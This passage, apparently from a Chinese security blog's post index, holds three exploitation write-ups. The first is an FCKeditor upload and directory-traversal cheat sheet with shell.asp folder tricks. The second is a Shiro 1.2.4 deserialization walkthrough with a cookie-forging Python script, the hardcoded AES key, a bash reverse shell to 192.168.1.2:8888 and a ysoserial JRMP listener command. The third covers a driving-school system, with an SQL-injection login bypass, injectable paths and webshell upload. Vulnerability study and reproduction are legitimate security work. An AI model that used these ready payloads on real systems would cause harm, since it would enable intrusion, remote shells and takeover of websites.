也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制。</p></li></ul><p><strong>突破建立文件夹</strong></p><pre><code>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=%2Fshell.asp&amp;NewFolderName=z&amp;uuid=1244789975684FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp</code></pre><p><strong>FCKeditor 中test 文件的上传地址</strong></p><pre><code>FCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.html</code></pre><p><strong>FCKeditor 常用上传地址</strong></p><pre><code>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)JSP 版：FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</code></pre><p>注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文<br>件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。</p><p><strong>其他上传地址</strong></p><pre><code>FCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.asp一般很多站点都已删除_samples 目录，可以试试。FCKeditor/editor/fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。</code></pre><p><strong>列目录漏洞也可助找上传地址</strong></p><pre><code>Version 2.4.1 测试通过修改CurrentFolder 参数使用 ../../来进入不同的目录/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=shell.asp根据返回的XML 信息可以查看网站所有的目录。FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F也可以直接浏览盘符：JSP 版本：FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F</code></pre><p><strong>FCKeditor 爆路径</strong></p><pre><code>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/shell.asp</code></pre><p><strong>FCKeditor 被动限制策略所导致的过滤不严问题</strong></p><pre><code>    影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3</code></pre><p>脆弱描述：<br>FCKeditor v2.4.3 中File 类别默认拒绝上传类型：<br>html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm<br>Fckeditor 2.0 &lt;= 2.2 允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension 为后缀.直接导致在win 下在上传文件后面加个.来突破[未测试]!<br>        而在apache 下，因为”Apache 文件名解析缺陷漏洞”也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘。<br>        在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用2003 解析漏洞建立xxx.asp文件夹或者上传xx.asp;.jpg!</p><p><strong>最古老的漏洞，Type文件没有限制！</strong></p><p>​    我接触到的第一个fckeditor漏洞了。版本不详，应该很古老了，因为程序对type=xxx 的类型没有检查。我们可以直接构造上传把type=Image 改成Type=hsren 这样就可以建立一个叫hsren的文件夹，一个新类型，没有任何限制，可以上传任意脚本！ </p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro RememberMe 1.2.4 反序列化过程命令执行漏洞</title>
      <link href="/2019/09/14/shiro-rememberme-1.2.4/"/>
      <url>/2019/09/14/shiro-rememberme-1.2.4/</url>
      
        <content type="html"><![CDATA[<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Shiro &lt;= 1.2.4</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><h5 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h5><p>勾选记住密码并登录页面上的账号密码，成功登录后台后返回Cookie中的rememberMe值为固定的512位</p><p><img src="https://i.loli.net/2019/09/11/wx5j9UVfeK6mr1D.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/09/11/nzjZIUkOweTgRdV.png" alt="image.png"></p><p>从官方文档中，我们知道在Shiro配置类中加入rememberMe管理器代码中写到cookie加密密钥默认为AES算法并且密钥为<code>2AvVhdsgUs0FSA3SDFAdag==</code>。</p><p><img src="https://i.loli.net/2019/09/11/ArXJOic7yk3vbht.png" alt="image.png"></p><p>接着进行AES加密。动态跟踪到<code>AbstractRememberMeManager</code>类的<code>encrypt</code>方法中，可以看到AES的模式为<code>AES/CBC/PKCS5Padding</code>，并且AES的key为<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>，转换为16进制后是<code>\x90\xf1\xfe\x6c\x8c\x64\xe4\x3d\x9d\x79\x98\x88\xc5\xc6\x9a\x68</code>，key为16字节，128位。</p><p><img src="https://i.loli.net/2019/09/12/RvhA3bBCI9fgu8c.png" alt="image.png"></p><p>进行AES加密，利用arraycopy()方法将随机的16字节IV放到序列化后的数据前面，完成后再进行AES加密。</p><p>最后在<code>CookieRememberMeManager</code>类的<code>rememberSerializedIdentity()</code>方法中进行base64加密：</p><p><img src="https://i.loli.net/2019/09/12/vWdNlxRCLMSj7y9.png" alt="image.png"></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>到Github获取<code>Apache Shiro 1.2.4版本</code> 源文件</p><pre><code>git clone https://github.com/apache/shiro.gitgit checkout shiro-root-1.2.4cd ./shiro/samples/web</code></pre><p>为了配合生成反序列化的漏洞环境，需要添加存在漏洞的 jar 包，编辑 <code>pom.xml</code>文件，添加如下行：</p><pre><code>&lt;!--  需要设置编译的版本 --&gt;     &lt;properties&gt;        &lt;maven.compiler.source&gt;1.6&lt;/maven.compiler.source&gt;        &lt;maven.compiler.target&gt;1.6&lt;/maven.compiler.target&gt;    &lt;/properties&gt;...    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;            &lt;artifactId&gt;jstl&lt;/artifactId&gt;            &lt;!--  这里需要将jstl设置为1.2 --&gt;            &lt;version&gt;1.2&lt;/version&gt;             &lt;scope&gt;runtime&lt;/scope&gt;        &lt;/dependency&gt;.....        &lt;dependency&gt;            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;            &lt;version&gt;4.0&lt;/version&gt;        &lt;/dependency&gt;&lt;dependencies&gt;</code></pre><p>修改完成后，使用<code>Maven</code> 把存在漏洞环境 war包进行编译</p><p>最终可以将 target 目录下生成的 samples-web-1.2.4.war 文件拷贝至 tomcat 目录下的 webapps 目录，这里将其重命名为了 shiro.war 文件，启动 tomcat， 在浏览器当中输入 <a href="http://localhost:8080/shiro" target="_blank" rel="noopener">http://localhost:8080/shiro</a> 可以看到登录页面，如下图:</p><p> <img src="https://i.loli.net/2019/09/11/HKZdLoFT8Cr49Gj.png" alt="op"></p><p>然后，获取我们复现需要用到的<code>ysoserial</code>工具</p><pre><code>git　clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -DskipTests</code></pre><p>生成的工具在<code>target/</code>目录下<code>ysoserial-0.0.6-SNAPSHOT-all.jar</code>文件</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p> 恶意 <code>Cookie rememberMe</code>值构造</p><p> <code>前16字节的密钥</code>–&gt;后面<code>加入序列化参数</code>–&gt;<code>AES加密</code>–&gt;<code>base64编码</code>–&gt;发送<code>cookie</code></p><p>生成恶意rememberMe参数值Python代码</p><p><code>python PopX.py 攻击者IP:PORT</code></p><pre><code>import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):  #ysoserial-0.0.6-SNAPSHOT-all.jar 文件需要在该文件目录    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])print &quot;rememberMe={0}&quot;.format(payload.decode())</code></pre><p><img src="https://i.loli.net/2019/09/12/aTZ7gpn13IbKxvF.png" alt="image.png"></p><p>接下来制作反弹shell代码</p><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.2/8888 0&gt;&amp;1</code></pre><p>然后进行Java反序列化绕过 base64编码</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://i.loli.net/2019/09/12/PuaKJXIAhvCGjmk.png" alt="image.png"></p><p>再使用<code>ysoserial</code>中JRMP监听模块，监听3888端口<code>注意这里的端口是刚才生成rememberMe值的端口</code>。 再加上生成的base64编码。</p><pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3888 CommonsCollections5 &#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&#39;</code></pre><p><img src="https://i.loli.net/2019/09/12/hrjHBCo7JbtyQeT.png" alt="image.png"></p><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>将使用PopX.py脚本生成的Cookie带入Cookie请求中即连接成功反弹Shell。</p><p><img src="https://i.loli.net/2019/09/12/7TjiQfMUCOc3L1p.png" alt="image.png"></p><p>这里会收到请求数据再而远程执行命令</p><p><img src="https://i.loli.net/2019/09/12/HujFBi5KNb8UxaP.png" alt="image.png"></p><p>监听端口也收到反弹Shell</p><p><img src="https://i.loli.net/2019/09/12/ulpwmvsZniUcdaP.png" alt="image.png"></p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>升级到Shiro 1.2.5以上版本</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1039家校通漏洞总结</title>
      <link href="/2019/09/14/1039/"/>
      <url>/2019/09/14/1039/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>​    北京壹零叁玖科技发展有限公司(简称1039公司)是国内第一家专业从事培训行业标准化软件开发和大型应用性平台的高科技企业，是培训行业信息化建设的最佳合作伙伴。</p><p>1039家校通网上约车系统是一款驾校一体化系统。</p><p><img src="https://i.loli.net/2019/10/26/fDzCsTPXkBGAipO.png" alt="image.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="SQL注入万能密码"><a href="#SQL注入万能密码" class="headerlink" title="SQL注入万能密码"></a>SQL注入万能密码</h4><p>影响版本: 家校通v1.0  - v.6.0</p><p>登录接口</p><pre><code>/admin/Product/Comstye.aspx/Student/StudentLogin.aspx/Teacher/Index.aspx</code></pre><p><strong>管理员</strong></p><p>用户名密码均输入： ‘ or ‘’=’ （都是单引号）可直接进入。</p><p><img src="https://i.loli.net/2019/09/01/8gQHWsE7Xihzofn.png" alt="1567317867435.png"></p><p>登陆后可任意修改网站内容</p><p><img src="https://i.loli.net/2019/09/01/S8bAOypRX9K2TG1.png" alt="1567318261894.png"></p><h4 id="教练点评处存在SQL注入"><a href="#教练点评处存在SQL注入" class="headerlink" title="教练点评处存在SQL注入"></a>教练点评处存在SQL注入</h4><pre><code>/Teacher/TeacherPf.aspx?yid=0030</code></pre><p><img src="https://i.loli.net/2019/09/01/W8MS7TAhqfuHXD1.png" alt="1567322657154.png"></p><p><img src="https://i.loli.net/2019/09/01/ldhsSJpK5X7bziy.png" alt="1567328906324.png"></p><h4 id="管理员后台增加分类处存在SQL注入"><a href="#管理员后台增加分类处存在SQL注入" class="headerlink" title="管理员后台增加分类处存在SQL注入"></a>管理员后台增加分类处存在SQL注入</h4><pre><code>/admin/Product/comstye2.aspx/admin/yk/Index.aspx</code></pre><p>配合SQL万能密码进入后台，然后访问：</p><p><img src="https://i.loli.net/2019/09/01/oG5yqL6KBlvu42C.png" alt="1567321823408.png"></p><p><img src="https://i.loli.net/2019/09/01/CVRHmatUbclI5w8.png" alt="1567321715856.png"></p><p><img src="https://i.loli.net/2019/09/01/QzeC7uNBLPRF1oh.png" alt="1567321705586.png"></p><h4 id="后台管理编辑器任意文件上传"><a href="#后台管理编辑器任意文件上传" class="headerlink" title="后台管理编辑器任意文件上传"></a>后台管理编辑器任意文件上传</h4><p>上传文件</p><p><img src="https://i.loli.net/2019/09/01/aXg3nAxYFQ2EIhr.png" alt="1567329246720.png"></p><p>Burp抓包重放数据 模块，可以看到上传的地址；</p><p><img src="https://i.loli.net/2019/09/01/z9qTfBHeNMShjAI.png" alt="1567329315435.png"></p><p>访问路径 就是大马的地址</p><p><img src="https://i.loli.net/2019/09/01/YxanmheG8trgodQ.png" alt="image.png"></p><p><img src="https://i.loli.net/2019/09/01/fbsNvJuHaGD7YwU.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
